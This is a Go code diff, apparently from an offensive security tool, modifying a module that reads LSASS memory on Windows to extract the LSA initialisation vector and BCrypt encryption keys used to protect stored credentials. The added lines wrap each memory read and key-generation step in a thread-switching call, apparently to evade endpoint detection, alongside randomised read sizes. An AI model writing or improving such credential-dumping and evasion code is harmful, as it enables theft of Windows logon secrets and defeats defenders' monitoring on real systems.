@@ -11,6 +11,7 @@ import (
 
 	"project/internal/logger"
 	"project/internal/module/windows/api"
+	"project/internal/security"
 )
 
 type lsaNT6 struct {
@@ -151,6 +152,8 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 	if err != nil {
 		return err
 	}
+	doneRead := security.SwitchThreadAsync()
+	defer lsa.ctx.waitSwitchThreadAsync(doneRead)
 	size := uintptr(lsasrv.size - (256 - lsa.ctx.rand.Int(256)))
 	memory := make([]byte, size)
 	_, err = api.ReadProcessMemory(pHandle, lsasrv.address, &memory[0], size)
@@ -170,6 +173,8 @@ func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
 	if index == -1 {
 		return errors.New("failed to search lsa init protected memory reference pattern")
 	}
+	doneIV := security.SwitchThreadAsync()
+	defer lsa.ctx.waitSwitchThreadAsync(doneIV)
 	// read offset about iv
 	address := lsasrv.address + uintptr(index+patch.offsets.off0)
 	var offset uint32
@@ -266,6 +271,8 @@ func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm
 		bhKeyTag = 0x55555552 // U U U R
 		bKeyTag  = 0x4D53534B // M S S K
 	)
+	doneAddr := security.SwitchThreadAsync()
+	defer lsa.ctx.waitSwitchThreadAsync(doneAddr)
 	var offset int32
 	size := unsafe.Sizeof(offset)
 	err := lsa.ctx.readMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
@@ -305,6 +312,8 @@ func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm
 		bcryptKeySize = unsafe.Sizeof(bcryptKey81{})
 		bcryptKeyOffset = unsafe.Offsetof(bcryptKey81{}.hardKey)
 	}
+	doneKey := security.SwitchThreadAsync()
+	defer lsa.ctx.waitSwitchThreadAsync(doneKey)
 	bKey := make([]byte, bcryptKeySize)
 	err = lsa.ctx.readMemoryEnd(pHandle, bhKey.key, &bKey[0], bcryptKeySize)
 	if err != nil {
@@ -325,6 +334,8 @@ func (lsa *lsaNT6) acquireKey(pHandle windows.Handle, address uintptr, algorithm
 }
 
 func (lsa *lsaNT6) generateSymmetricKey(hardKeyData []byte, algorithm string) error {
+	done := security.SwitchThreadAsync()
+	defer lsa.ctx.waitSwitchThreadAsync(done)
 	// open provider
 	algHandle, err := api.BCryptOpenAlgorithmProvider(algorithm, "", 0)
 	if err != nil {
